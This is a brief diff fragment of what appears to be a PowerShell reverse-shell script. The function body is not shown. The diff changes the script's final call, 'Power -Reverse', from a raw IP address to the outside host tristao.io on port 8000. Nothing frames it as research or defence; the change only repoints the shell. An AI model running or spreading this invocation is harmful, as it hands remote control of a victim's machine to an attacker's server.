@@ -84,5 +84,6 @@ function Power
     }
 }
 
-Power -Reverse -IPAddress 181.215.135.141 -Port 8000
+Power -Reverse -IPAddress tristao.io -Port 8000
+
 
